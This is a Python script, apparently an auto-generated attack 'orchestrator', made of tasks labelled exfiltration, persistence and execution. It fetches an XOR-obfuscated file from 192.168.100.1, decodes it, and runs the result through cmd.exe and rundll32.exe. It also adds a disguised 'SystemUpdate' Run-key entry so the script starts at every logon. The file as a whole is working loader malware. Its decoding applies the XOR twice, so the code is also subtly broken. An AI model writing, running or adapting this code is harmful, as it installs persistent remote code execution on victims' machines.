#!/usr/bin/env python3
import sys
import json
import time
import requests
import base64
import subprocess
import os
from typing import Dict, Any

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    url = "https://192.168.100.1/update/config.bin"
    xor_key = 0x41
    try:
        # Download the configuration file
        response = requests.get(url, stream=True, timeout=30)
        response.raise_for_status()

        # Write the content to a temporary file
        temp_file_path = "downloaded_config.bin"
        with open(temp_file_path, 'wb') as f:
            for chunk in response.iter_content(8192):
                f.write(chunk)

        # Verify the file exists and size > 0
        with open(temp_file_path, 'rb') as f:
            content = f.read()
            if len(content) == 0:
                raise ValueError("Downloaded file is empty")

        # XOR decrypt the content
        decrypted_content = bytes(b ^ xor_key for b in content)

        # Prepare the result
        result = {
            "content": decrypted_content.hex()
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Retrieve and decode the content
        content = bytes.fromhex(input_data.get('content', ''))
        
        # XOR with key 0x41
        xor_key = 0x41
        decoded_bytes = bytes(b ^ xor_key for b in content)
        
        # Base64 decode
        decoded_content = base64.b64decode(decoded_bytes).decode('utf-8')
        
        result = {
            "decoded_content": decoded_content
        }
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        decoded_content = input_data.get('decoded_content', '')

        # Execute using cmd.exe
        cmd_result = subprocess.run(
            ['cmd.exe', '/c', decoded_content],
            capture_output=True,
            text=True,
            timeout=30
        )

        if cmd_result.returncode != 0:
            print(f"cmd.exe execution failed: {cmd_result.stderr}")

        # Execute using rundll32.exe
        rundll32_result = subprocess.run(
            ['rundll32.exe', decoded_content, 'entrypoint'],
            capture_output=True,
            timeout=30
        )

        if rundll32_result.returncode != 0:
            print(f"rundll32.exe execution failed: {rundll32_result.stderr}")
            return {'success': False, 'data': {'success': False},
                    'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

        return {'success': True, 'data': {'success': True},
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'success': False},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Determine the executable path
        exe_path = sys.executable if hasattr(sys, 'executable') else os.path.abspath(sys.argv[0])
        
        # Registry key details
        key_name = "SystemUpdate"
        registry_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        
        # Open the registry key
        import winreg
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE) as key:
            # Set the value for auto-start
            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
            
            # Verify by reading back the value
            registered_value, _ = winreg.QueryValueEx(key, key_name)
            registered = (registered_value == exe_path)
        
        result = {'registered': registered}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        result = {'registered': False}
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Retrieve Configuration File [exfiltration] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Retrieve Configuration File): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Retrieve Configuration File): FAILED — {err}')
            failed.append('T1')
            r2 = task_T1(None)
            if r2.get('success'):
                outputs['T1'] = r2.get('data', {})
                failed.remove('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T4: Set Auto-Start on Logon [persistence] ──
    try:
        r = task_T4(None)
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Set Auto-Start on Logon): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Set Auto-Start on Logon): FAILED — {err}')
            failed.append('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    # ── T2: Decode Configuration File [data-processing] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Decode Configuration File): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Decode Configuration File): FAILED — {err}')
            failed.append('T2')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T3: Execute Decoded Content [execution] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Execute Decoded Content): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Execute Decoded Content): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))